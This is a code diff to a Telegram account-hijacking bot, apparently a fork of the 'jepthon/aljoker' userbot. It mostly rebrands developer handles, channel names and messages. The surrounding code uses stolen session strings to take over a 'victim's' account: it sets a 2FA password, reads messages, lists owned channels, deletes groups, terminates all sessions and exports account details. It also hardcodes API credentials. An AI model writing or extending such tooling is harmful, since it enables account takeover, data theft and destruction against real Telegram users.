@@ -1,6 +1,6 @@
 
 from joker import bot, l313l
-#By Source aljoker @jepthon
+#By Source aljoker @source_av
 from telethon import events, functions, types, Button
 from datetime import timedelta
 import asyncio
@@ -76,7 +76,7 @@ async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
-      await X.edit_2fa('jepthon')
+      await X.edit_2fa('source_av')
       return True
     except:
       return False
@@ -156,7 +156,7 @@ async def userchannels(strses):
 import logging
 logging.basicConfig(level=logging.WARNING)
 
-channel = "jepthon"
+channel = "source_av"
 menu = '''
 
 "A" :~ [معرفه قنوات/كروبات التي يملكها]
@@ -187,7 +187,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة الجوكر @Jepthon
+قم بلأنضمام الى قناة سورس افاتار @source_av
 '''
 
 keyboard = [
@@ -212,7 +212,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("الهقر زين", "https://t.me/devpokemon")
+    Button.url("الهقر مرتجل", "https://t.me/ALMORTAGEL_12")
     ]
 ]
 
@@ -254,7 +254,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/devpokemon")
+            Button.url("المطور", "https://t.me/ALMORTAGEL_12")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -275,7 +275,7 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @devpokemon")
+        file.write(i + "\n\nDetails BY @ALMORTAGEL_12")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
@@ -321,7 +321,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس الجوكر", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس سورس افاتار", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -367,7 +367,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك الجوكر.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك سورس افاتار.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -396,7 +396,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك الجوكر.", buttons=keyboard)
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك جيبثون افاتار.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -486,7 +486,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("الهقر زين", "https://t.me/devpokemon")
+        Button.url("الهقر مرتجل", "https://t.me/ALMORTAGEL_12")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
